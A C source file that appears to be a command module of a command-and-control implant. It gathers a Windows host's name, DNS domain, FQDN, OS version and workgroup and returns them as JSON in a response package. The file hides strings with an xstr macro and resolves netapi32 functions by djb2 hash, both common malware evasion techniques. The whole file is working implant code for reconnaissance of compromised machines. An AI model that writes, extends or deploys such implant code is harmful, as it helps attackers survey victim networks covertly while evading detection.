#include "config.h"
#ifdef INCLUDE_CMD_DOMAININFO

#include "commands.h"
#include "json_out.h"

typedef DWORD (WINAPI *fn_GetComputerNameExA_t)(DWORD, char*, DWORD*);
typedef DWORD (WINAPI *fn_NetWkstaGetInfo_t)(LPCWSTR, DWORD, void*);
typedef DWORD (WINAPI *fn_NetApiBufferFree_t)(void*);

// NOTE: naturally aligned - WKSTA_INFO_100 has void* members at offsets 8/16.
// A pack(1) struct misreads wki100_langroup as half a pointer and crashes
// inside WideCharToMultiByte (seen as KERNELBASE+0x55f8d AV in the minidump).
struct WKSTA_INFO_100 {
    DWORD wki100_platform_id;
    void* wki100_computername;
    void* wki100_langroup;
    DWORD wki100_ver_major;
    DWORD wki100_ver_minor;
};

VOID cmd_domaininfo(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_k32, "kernel32.dll");
    xstr(_net, "netapi32.dll");
    HMODULE h_k32 = inst->Win32.LoadLibraryA(_k32);
    HMODULE h_net = inst->Win32.LoadLibraryA(_net);
    fn_GetComputerNameExA_t pGet = h_k32 ?
        (fn_GetComputerNameExA_t)(void*)inst->Win32.GetProcAddress(h_k32, "GetComputerNameExA") : NULL;
    fn_NetWkstaGetInfo_t pWksta = h_net ?
        (fn_NetWkstaGetInfo_t)resolve_function(h_net, hash_string_djb2(XSTR("NetWkstaGetInfo"))) : NULL;
    fn_NetApiBufferFree_t pFree = h_net ?
        (fn_NetApiBufferFree_t)resolve_function(h_net, hash_string_djb2(XSTR("NetApiBufferFree"))) : NULL;

    char hostname[256] = {0}, domain[256] = {0}, fqdn[256] = {0};
    DWORD sz = 255;
    // ComputerNameDnsDomain=1, ComputerNameDnsFullyQualified=3, ComputerNameNetBIOS=0
    if (pGet) {
        pGet(0, hostname, &sz);
        sz = 255; pGet(1, domain, &sz);
        sz = 255; pGet(3, fqdn, &sz);
    }

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"hostname\":");
    j_append_str(&jb, hostname);
    j_append_raw(&jb, ",\"domain\":");
    j_append_str(&jb, domain);
    j_append_raw(&jb, ",\"fqdn\":");
    j_append_str(&jb, fqdn);

    // NetWkstaGetInfo(level 100) for version info
    if (pWksta) {
        void* buf = NULL;
        DWORD st = pWksta(NULL, 100, &buf);
        if (st == 0 && buf) {
            WKSTA_INFO_100* info = (WKSTA_INFO_100*)buf;
            j_append_raw(&jb, ",\"ver_major\":");
            j_append_uint(&jb, info->wki100_ver_major);
            j_append_raw(&jb, ",\"ver_minor\":");
            j_append_uint(&jb, info->wki100_ver_minor);
            // langroup
            wchar_t* lg = (wchar_t*)info->wki100_langroup;
            if (lg) {
                char lgb[128] = {0};
                typedef int (WINAPI *fn_wc_t)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
                fn_wc_t wc = (fn_wc_t)(void*)inst->Win32.GetProcAddress(h_k32, "WideCharToMultiByte");
                if (wc) wc(0, 0, lg, -1, lgb, 128, NULL, NULL);
                j_append_raw(&jb, ",\"workgroup\":");
                j_append_str(&jb, lgb);
            }
            if (pFree) pFree(buf);
        }
    }
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
